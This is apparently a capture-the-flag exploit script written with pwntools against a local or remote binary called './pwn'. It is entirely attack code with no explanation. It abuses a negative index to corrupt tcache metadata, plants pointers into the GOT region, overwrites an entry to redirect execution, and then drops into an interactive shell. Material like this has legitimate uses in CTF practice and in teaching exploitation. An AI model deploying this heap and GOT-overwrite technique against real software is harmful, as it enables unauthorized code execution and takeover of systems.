#coding=utf-8
from pwn import *

context(arch="amd64", os="linux")
context.log_level='debug'
# context.terminal=['tmux','splitw','-h']

ip = ''
port = ''
reomote_addr = [ip,port]
binary = './pwn'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF(binary)
if len(sys.argv)==1:
    p = process(binary)

if len(sys.argv)==2 :
    p = remote(reomote_addr[0],reomote_addr[1])

#----------------------------------------------------------------------
ru = lambda x : p.recvuntil(x,timeout=0.2)
sd = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
it = lambda :p.interactive()
ru7f = lambda : u64(ru('\x7f')[-6:].ljust(8,b'\x00'))
rv6 = lambda : u64(rv(6)+b'\x00'*2)
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bp = lambda src=None : attach(p,src)
sym = lambda name : libc.sym[name]
#----------------------------------------------------------------------

def leak(offset):
	addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
	base = addr - offset
	print "[+]libc_base=>"+hex(base)
	return base


attach(p)
sla('> ','2') 
sl(str(-0x290)) 
sla('> ','1') 
sl(str(0x280))

payload = p64(0x0001000100010001)*0x2+p64(0)*0xe+p64(0x404018)*5+p64(0x404080) 
sl(payload) 
sla('> ','1')


sl(str(0x50))
sl(p64(0x401517)+p64(0x401040))
pause()

sla('> ','1')
sl(str(0x60)) 
sl('fffffff')
sla('>','3')

it()